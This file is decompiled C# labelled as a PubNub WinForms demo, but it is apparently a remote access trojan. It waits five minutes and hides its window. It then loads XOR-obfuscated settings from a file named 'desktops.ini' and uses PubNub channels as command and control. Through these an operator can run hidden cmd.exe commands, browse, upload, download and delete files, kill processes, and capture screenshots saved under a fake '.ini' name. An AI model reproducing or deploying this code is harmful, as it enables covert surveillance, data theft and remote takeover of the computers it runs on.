using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace PubnubApi.WinFormExample;

public class PubnubDemoForm : Form
{
	public enum COMMAND
	{
		NONE,
		HELLO_REQUEST,
		HELLO_REPLY,
		BYE_REQUEST,
		BYE_REPLY,
		DRIVE_REQUEST,
		DRIVE_REPLY,
		FILE_REQUEST,
		FILE_REPLY,
		UPDATE_REQUEST,
		UPDATE_REPLY,
		COPY_REQUEST,
		COPY_REPLY,
		CUT_REQUEST,
		CUT_REPLY,
		RENAME_REQUEST,
		RENAME_REPLY,
		DELETE_REQUEST,
		DELETE_REPLY,
		UPLOAD_REQUEST,
		UPLOAD_REPLY,
		UPLOAD_CONTENT,
		UPLOAD_CONTENT_REPLY,
		UPLOAD_END,
		UPLOAD_END_REPLY,
		DOWNLOAD_REQUEST,
		DOWNLOAD_REPLY,
		DOWNLOAD_CONTENT,
		DOWNLOAD_CONTENT_REPLY,
		DOWNLOAD_END,
		DOWNLOAD_END_REPLY,
		COMMAND_RUN,
		COMMAND_RUN_REPLY,
		PROCESS_STOP,
		PROCESS_STOP_REPLY,
		PROCESS_REFRESH,
		PROCESS_REFRESH_REPLY,
		SCREEN,
		SCREEN_REPLY,
		SCREEN_CONTENT,
		SCREEN_CONTENT_REPLY,
		SCREEN_END,
		SCREEN_END_REPLY,
		CONFIG_REQUEST,
		CONFIG_REPLY
	}

	public class MetaObject
	{
		[JsonProperty("Id")]
		public string command { get; set; }

		[JsonProperty("File")]
		public byte[] file { get; set; }

		[JsonProperty("Content")]
		public string content { get; set; }
	}

	public class ResponseObject
	{
		[JsonProperty("Message")]
		public string id { get; set; }

		[JsonProperty("Channel")]
		public string channel { get; set; }

		[JsonProperty("Subscription")]
		public string subscription { get; set; }

		[JsonProperty("Timetoken")]
		public string timetoken { get; set; }

		[JsonProperty("UserMetadata")]
		public MetaObject metadata { get; set; }
	}

	private static string PAPA = "PAPA";

	private static string HAIZI = "HAIZI";

	private static string VERSION = "1.0";

	private static string DOTNET_VERSION = "4.5";

	private string m_strMyInformation;

	private string m_strFileUploadPath;

	private string m_strFileDownloadPath;

	private static int m_nBufSize = 16384;

	private byte[] m_bufFileContent;

	private int m_nSegmentNumber;

	public static Pubnub pubnub;

	private PNConfiguration config;

	private static string m_strConfigPath = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location) + "\\desktops.ini";

	private string m_strChannelName = "";

	private string m_strChannelNameTmp = "";

	private IContainer components;

	public PubnubDemoForm()
	{
		AppDomain.CurrentDomain.AssemblyResolve += delegate(object sender, ResolveEventArgs args)
		{
			string resourceName = new AssemblyName(args.Name).Name + ".dll";
			string name = Array.Find(((object)this).GetType().Assembly.GetManifestResourceNames(), (string element) => element.EndsWith(resourceName));
			using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
			byte[] array = new byte[stream.Length];
			stream.Read(array, 0, array.Length);
			return Assembly.Load(array);
		};
		InitializeComponent();
		Thread.Sleep(300000);
		InitializeVariable();
		Subscribe(m_strChannelName);
		Subscribe(m_strChannelNameTmp);
		SendHello();
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).set_ShowInTaskbar(false);
	}

	private void PubnubDemoForm_FormClosed(object sender, FormClosedEventArgs e)
	{
		SendBye();
		Unsubscribe(m_strChannelName);
		Unsubscribe(m_strChannelNameTmp);
		Disconnect();
	}

	public string calcXor(string a, byte val)
	{
		char[] array = a.ToCharArray();
		char[] array2 = new char[a.Length];
		for (int i = 0; i < a.Length; i++)
		{
			array2[i] = (char)(array[i] ^ val);
		}
		return new string(array2);
	}

	public void SetPubnub(string[] strArr)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		if (strArr.Length != 7)
		{
			return;
		}
		for (int i = 0; i < strArr.Length; i++)
		{
			strArr[i] = calcXor(strArr[i], 23);
		}
		m_strChannelNameTmp = strArr[1];
		config = new PNConfiguration();
		config.set_Origin(strArr[0]);
		config.set_SubscribeKey(strArr[2]);
		config.set_PublishKey(strArr[3]);
		config.set_Uuid(m_strMyInformation);
		config.set_ReconnectionPolicy((PNReconnectionPolicy)1);
		pubnub = new Pubnub(config);
		pubnub.AddListener((SubscribeCallback)new SubscribeCallbackExt((Action<Pubnub, PNMessageResult<object>>)delegate(Pubnub o, PNMessageResult<object> m)
		{
			ResponseObject responseObject2 = pubnub.get_JsonPluggableLibrary().DeserializeToObject<ResponseObject>(pubnub.get_JsonPluggableLibrary().SerializeToJsonString((object)m));
			if (responseObject2.id == m_strMyInformation || responseObject2.id == HAIZI)
			{
				if (responseObject2.metadata.content == null)
				{
					responseObject2.metadata.content = "";
				}
				if (responseObject2.metadata.file == null)
				{
					responseObject2.metadata.file = new byte[0];
				}
				ProcessMsg((COMMAND)Convert.ToInt32(responseObject2.metadata.command), responseObject2.metadata.file, responseObject2.metadata.content);
			}
		}, (Action<Pubnub, PNPresenceEventResult>)delegate(Pubnub o, PNPresenceEventResult p)
		{
			ResponseObject responseObject = pubnub.get_JsonPluggableLibrary().DeserializeToObject<ResponseObject>(pubnub.get_JsonPluggableLibrary().SerializeToJsonString((object)p));
			if (responseObject.id == m_strMyInformation || responseObject.id == HAIZI)
			{
				if (responseObject.metadata.content == null)
				{
					responseObject.metadata.content = "";
				}
				if (responseObject.metadata.file == null)
				{
					responseObject.metadata.file = new byte[0];
				}
				ProcessMsg((COMMAND)Convert.ToInt32(responseObject.metadata.command), responseObject.metadata.file, responseObject.metadata.content);
			}
		}, (Action<Pubnub, PNStatus>)delegate(Pubnub o, PNStatus s)
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I4
			if ((int)s.get_Operation() == 1 && (int)s.get_Category() == 7)
			{
				Disconnect();
				Reconnect();
			}
		}));
	}

	public void InitializeVariable()
	{
		m_strMyInformation = Environment.MachineName + "_" + GetMACAddress();
		m_strChannelName = m_strMyInformation;
		pubnub = null;
		m_nSegmentNumber = -99;
		if (File.Exists(m_strConfigPath))
		{
			string[] array = File.ReadAllLines(m_strConfigPath);
			SetPubnub(array);
		}
	}

	private void Subscribe(string strChannelName)
	{
		if (pubnub != null)
		{
			pubnub.Subscribe<string>().WithPresence().Channels(strChannelName.Split(new char[1] { ',' }))
				.Execute();
		}
	}

	private void Unsubscribe(string strChannelName)
	{
		if (pubnub != null)
		{
			pubnub.Unsubscribe<string>().Channels(strChannelName.Split(new char[1] { ',' })).Execute();
		}
	}

	private void Publish(string strChannelName, string strId, COMMAND commandType, string strKey = "", object objMetaData = null, string strKey2 = "", object objMetaData2 = null)
	{
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		if (pubnub != null)
		{
			if (strKey == "Content")
			{
				objMetaData = calcXor((string)objMetaData, 17);
			}
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add("Id", commandType);
			if (strKey != "")
			{
				dictionary.Add(strKey, objMetaData);
			}
			if (strKey2 != "")
			{
				dictionary.Add(strKey2, objMetaData2);
			}
			pubnub.Publish().Channel(strChannelName).Message((object)strId)
				.Meta(dictionary)
				.ShouldStore(false)
				.UsePOST(false)
				.Async((PNCallback<PNPublishResult>)new PNPublishResultExt((Action<PNPublishResult, PNStatus>)delegate
				{
				}));
		}
	}

	private void Disconnect()
	{
		if (pubnub != null)
		{
			pubnub.Disconnect<string>();
		}
	}

	private void Reconnect()
	{
		if (pubnub != null)
		{
			pubnub.Reconnect<string>();
		}
	}

	public void SendHello()
	{
		Publish(m_strChannelNameTmp, PAPA, COMMAND.HELLO_REPLY, "Content", m_strMyInformation);
	}

	public void SendBye()
	{
		Publish(m_strChannelNameTmp, PAPA, COMMAND.BYE_REQUEST, "Content", m_strMyInformation);
	}

	public string GetMACAddress()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		string text = string.Empty;
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (text == string.Empty)
			{
				networkInterface.GetIPProperties();
				text = networkInterface.GetPhysicalAddress().ToString();
			}
		}
		return text;
	}

	private void ProcessMsg(COMMAND commandType, byte[] metaFile, string strContent)
	{
		//IL_0743: Unknown result type (might be due to invalid IL or missing references)
		//IL_0748: Unknown result type (might be due to invalid IL or missing references)
		//IL_074e: Expected O, but got Unknown
		strContent = calcXor(strContent, 17);
		strContent = strContent.Replace("\\\\", "\\");
		COMMAND commandType2 = COMMAND.NONE;
		string text = "";
		switch (commandType)
		{
		case COMMAND.HELLO_REQUEST:
			commandType2 = COMMAND.HELLO_REPLY;
			text = m_strMyInformation;
			Publish(m_strChannelNameTmp, PAPA, COMMAND.HELLO_REPLY, "Content", text);
			return;
		case COMMAND.DRIVE_REQUEST:
		{
			commandType2 = COMMAND.DRIVE_REPLY;
			DriveInfo[] drives = DriveInfo.GetDrives();
			text = text + VERSION + "," + DOTNET_VERSION + "," + Assembly.GetEntryAssembly()!.Location + ",";
			for (int l = 0; l < drives.Length; l++)
			{
				string name = drives[l].Name;
				name = name.Replace("\\", "");
				text = text + name + ",";
			}
			break;
		}
		case COMMAND.COPY_REQUEST:
		{
			commandType2 = COMMAND.COPY_REPLY;
			text = strContent;
			string text3 = ",";
			string[] array2 = strContent.Split(text3.ToCharArray());
			if (array2.Length == 2)
			{
				try
				{
					File.Copy(array2[0], array2[1], overwrite: true);
				}
				catch
				{
				}
			}
			break;
		}
		case COMMAND.CUT_REQUEST:
		{
			commandType2 = COMMAND.CUT_REPLY;
			text = strContent;
			string text4 = ",";
			string[] array3 = strContent.Split(text4.ToCharArray());
			if (array3.Length == 2)
			{
				try
				{
					File.Copy(array3[0], array3[1], overwrite: true);
				}
				catch
				{
				}
				File.Delete(array3[0]);
			}
			break;
		}
		case COMMAND.RENAME_REQUEST:
		{
			commandType2 = COMMAND.RENAME_REPLY;
			text = strContent;
			string text2 = ",";
			string[] array = strContent.Split(text2.ToCharArray());
			if (array.Length == 2)
			{
				try
				{
					File.Copy(array[0], array[1], overwrite: true);
				}
				catch
				{
				}
				File.Delete(array[0]);
			}
			break;
		}
		case COMMAND.DELETE_REQUEST:
			commandType2 = COMMAND.DELETE_REPLY;
			text = strContent;
			File.Delete(strContent);
			break;
		case COMMAND.UPLOAD_REQUEST:
			commandType2 = COMMAND.UPLOAD_REPLY;
			File.Create(strContent).Close();
			m_strFileUploadPath = strContent;
			break;
		case COMMAND.UPLOAD_CONTENT:
			commandType2 = COMMAND.UPLOAD_CONTENT_REPLY;
			if (metaFile != null)
			{
				FileStream fileStream2 = File.OpenWrite(m_strFileUploadPath);
				fileStream2.Seek(0L, SeekOrigin.End);
				fileStream2.Write(metaFile, 0, metaFile.Length);
				fileStream2.Close();
			}
			break;
		case COMMAND.UPLOAD_END:
			commandType2 = COMMAND.UPLOAD_END_REPLY;
			if (metaFile != null)
			{
				FileStream fileStream = File.OpenWrite(m_strFileUploadPath);
				fileStream.Seek(0L, SeekOrigin.End);
				fileStream.Write(metaFile, 0, metaFile.Length);
				fileStream.Close();
			}
			break;
		case COMMAND.COMMAND_RUN:
		{
			commandType2 = COMMAND.COMMAND_RUN_REPLY;
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.ErrorDialog = false;
			process.StartInfo.Arguments = "cmd /c " + strContent;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			text = process.StandardOutput.ReadToEnd();
			process.WaitForExit(5000);
			break;
		}
		case COMMAND.PROCESS_STOP:
		{
			commandType2 = COMMAND.PROCESS_STOP_REPLY;
			Process[] processesByName = Process.GetProcessesByName(strContent);
			if (processesByName.Length != 0)
			{
				processesByName[0].Kill();
			}
			Process[] processes = Process.GetProcesses();
			for (int k = 0; k < processes.Length; k++)
			{
				text = text + processes[k].ProcessName + ",";
			}
			break;
		}
		case COMMAND.PROCESS_REFRESH:
		{
			commandType2 = COMMAND.PROCESS_REFRESH_REPLY;
			Process[] processes2 = Process.GetProcesses();
			for (int n = 0; n < processes2.Length; n++)
			{
				try
				{
					text = text + processes2[n].ProcessName + ";;" + processes2[n].Id + ";;" + processes2[n].MainModule!.FileVersionInfo.FileDescription + ",";
				}
				catch (Exception)
				{
				}
			}
			break;
		}
		case COMMAND.CONFIG_REQUEST:
		{
			commandType2 = COMMAND.CONFIG_REPLY;
			string text5 = ",";
			string[] array4 = strContent.Split(text5.ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
			if (array4.Length == 7)
			{
				StreamWriter streamWriter = File.CreateText(m_strConfigPath);
				for (int m = 0; m < array4.Length; m++)
				{
					array4[m] = calcXor(array4[m], 23);
					streamWriter.WriteLine(array4[m]);
				}
				streamWriter.Close();
				SetPubnub(array4);
			}
			break;
		}
		case COMMAND.FILE_REQUEST:
		case COMMAND.UPDATE_REQUEST:
			commandType2 = ((commandType != COMMAND.FILE_REQUEST) ? COMMAND.UPDATE_REPLY : COMMAND.FILE_REPLY);
			text = strContent + ",";
			if (strContent != "")
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(strContent);
				if (!directoryInfo.Exists)
				{
					return;
				}
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				for (int i = 0; i < directories.Length; i++)
				{
					text = text + directories[i].Name.Replace("\\", "") + ",";
				}
				text += "||,";
				FileInfo[] files = directoryInfo.GetFiles();
				for (int j = 0; j < files.Length; j++)
				{
					text = text + files[j].Name + "*" + files[j].Length / 1024L + "Kb*" + files[j].CreationTime.ToString("yyyy/MM/dd hh:mm:ss") + ",";
				}
			}
			break;
		}
		Publish(m_strChannelName, PAPA, commandType2, "Content", text);
		switch (commandType)
		{
		case COMMAND.DOWNLOAD_REQUEST:
			if (File.Exists(strContent))
			{
				commandType2 = COMMAND.DOWNLOAD_REPLY;
				m_strFileDownloadPath = strContent;
				m_bufFileContent = File.ReadAllBytes(m_strFileDownloadPath);
				m_nSegmentNumber = 0;
				Publish(m_strChannelName, PAPA, COMMAND.DOWNLOAD_REPLY, "Content", m_bufFileContent.Length.ToString());
			}
			break;
		case COMMAND.DOWNLOAD_CONTENT:
			commandType2 = COMMAND.DOWNLOAD_CONTENT_REPLY;
			if (m_nSegmentNumber >= 0)
			{
				if (m_bufFileContent.Length > m_nBufSize * (m_nSegmentNumber + 1))
				{
					byte[] array6 = new byte[m_nBufSize];
					Buffer.BlockCopy(m_bufFileContent, m_nBufSize * m_nSegmentNumber, array6, 0, m_nBufSize);
					Publish(m_strChannelName, PAPA, commandType2, "File", array6);
				}
				else
				{
					byte[] array6 = new byte[m_bufFileContent.Length - m_nBufSize * m_nSegmentNumber];
					commandType2 = COMMAND.DOWNLOAD_END;
					Buffer.BlockCopy(m_bufFileContent, m_nBufSize * m_nSegmentNumber, array6, 0, m_bufFileContent.Length - m_nBufSize * m_nSegmentNumber);
					m_nSegmentNumber = -99;
					Publish(m_strChannelName, PAPA, COMMAND.DOWNLOAD_END, "File", array6);
				}
				m_nSegmentNumber++;
			}
			break;
		case COMMAND.SCREEN:
			if (m_nSegmentNumber < 0)
			{
				Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)137224);
				Graphics.FromImage((Image)val).CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
				((Image)val).Save("tmp0120.ini", ImageFormat.get_Png());
				if (File.Exists("tmp0120.ini"))
				{
					commandType2 = COMMAND.SCREEN_REPLY;
					m_strFileDownloadPath = "tmp0120.ini";
					m_bufFileContent = File.ReadAllBytes(m_strFileDownloadPath);
					m_nSegmentNumber = 0;
					Publish(m_strChannelName, PAPA, COMMAND.SCREEN_REPLY, "Content", m_bufFileContent.Length.ToString());
				}
			}
			break;
		case COMMAND.SCREEN_CONTENT:
			commandType2 = COMMAND.SCREEN_CONTENT_REPLY;
			if (m_nSegmentNumber >= 0)
			{
				if (m_bufFileContent.Length > m_nBufSize * (m_nSegmentNumber + 1))
				{
					byte[] array5 = new byte[m_nBufSize];
					Buffer.BlockCopy(m_bufFileContent, m_nBufSize * m_nSegmentNumber, array5, 0, m_nBufSize);
					Publish(m_strChannelName, PAPA, commandType2, "File", array5);
				}
				else
				{
					byte[] array5 = new byte[m_bufFileContent.Length - m_nBufSize * m_nSegmentNumber];
					commandType2 = COMMAND.SCREEN_END;
					Buffer.BlockCopy(m_bufFileContent, m_nBufSize * m_nSegmentNumber, array5, 0, m_bufFileContent.Length - m_nBufSize * m_nSegmentNumber);
					m_nSegmentNumber = -99;
					Publish(m_strChannelName, PAPA, COMMAND.SCREEN_END, "File", array5);
				}
				m_nSegmentNumber++;
			}
			break;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(120, 0));
		((Control)this).set_Name("PubnubDemoForm");
		((Control)this).set_Text("Hawk");
		((Form)this).add_FormClosed(new FormClosedEventHandler(PubnubDemoForm_FormClosed));
		((Control)this).ResumeLayout(false);
	}
}
